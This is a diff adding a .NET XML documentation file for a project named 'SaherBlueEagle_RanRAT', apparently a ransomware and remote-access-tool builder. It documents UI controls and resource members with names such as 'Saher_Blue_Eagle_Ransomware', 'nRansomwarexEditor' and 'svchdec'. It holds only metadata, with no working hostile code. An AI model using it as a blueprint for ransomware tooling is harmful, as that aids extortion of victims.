@@ -1,0 +1,197 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+SaherBlueEagle_RanRAT
+</name>
+</assembly>
+<members>
+<member name="M:SaherBlueEagle_RanRAT.TransparentListView.#ctor">
+	<summary>
+ Creates a new TransparentListView object.
+ </summary>
+	<remarks></remarks>
+</member><member name="P:SaherBlueEagle_RanRAT.TransparentListView.ErrorTextColor">
+	<summary>
+ The color to use when a certain ListViewItem has unresolved issues.
+ </summary>
+</member><member name="P:SaherBlueEagle_RanRAT.TransparentListView.HighlightColor">
+	<summary>
+ The color to use when highlighting an item.
+ </summary>
+</member><member name="P:SaherBlueEagle_RanRAT.TransparentListView.RedrawInterval">
+	<summary>
+ The intervals at which to redraw the control when scrolling. Higher values are reccomended for less powerful CPUs.
+ Decrease this value if experiencing choppy redraws during scrolling. Values below 5-6ms may result in extreme CPU use.
+ </summary>
+</member><member name="P:SaherBlueEagle_RanRAT.TransparentListView.RedrawOnMouseMove">
+	<summary>
+ True if the control should be redrawn when the mouse is moved, otherwise False.
+ </summary>
+	<remarks>There have been some issues with the Set method, so it's temporarily disabled and has no effect.</remarks>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.background">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.bluexform">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.bluexform1">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.countryinfo">
+	<summary>
+  Looks up a localized string similar to 
+
+Afghanistan|33.00,65.00
+
+Akrotiri|34.37,32.58
+
+Albania|41.00,20.00
+
+Algeria|28.00,3.00
+
+American Samoa|-14.20,-170.00
+
+Andorra|42.30,1.30
+
+Angola|-12.30,18.30
+
+Anguilla|18.15,-63.10
+
+Antarctica|-90.00,0.00
+
+Antigua and Barbuda|17.03,-61.48
+
+Arctic Ocean|90.00,0.00
+
+Argentina|-34.00,-64.00
+
+Armenia|40.00,45.00
+
+Aruba|12.30,-69.58
+
+Ashmore and Cartier Islands|-12.14,123.05
+
+Atlantic Ocean|0.00,-25.00
+
+Australia|-27.00,133.00
+
+Austria|47.20,13.20
+
+Azerbaijan|40.30,47.30
+ [rest of string was truncated]";.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.dangernogui">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.nRansomwarex">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.nRansomwarexEditor">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.project">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.reac">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.redxform">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.redxform1">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.Saher_Blue_Eagle_Ransomware">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.shell1">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.shell2">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.shell3">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.shell4">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.shell5">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.shell6">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.shell7">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.svchdec">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.svchdec1">
+	<summary>
+  Looks up a localized string similar to Imports System.Net.Sockets
+Imports System.Collections.Generic
+Imports System.Drawing
+Imports Microsoft.VisualBasic.Strings
+Imports System.Windows.Forms
+Imports System.Drawing.Imaging
+Imports System.Drawing.Drawing2D
+Imports System.Runtime.InteropServices
+Imports System, Microsoft.VisualBasic
+Imports System.Diagnostics
+Imports System.IO
+Imports System.Threading
+Imports Microsoft.VisualBasic.Constants
+Imports Microsoft.VisualBasic.Interaction
+Imports Microsoft.VisualBasic.Conversion
+Imports Mic [rest of string was truncated]";.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.themexdesign">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.themexdesign1">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:SaherBlueEagle_RanRAT.My.Resources.Resources.xxx">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Icon similar to (Icon).
+</summary>
+</member><member name="T:SaherBlueEagle_RanRAT.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
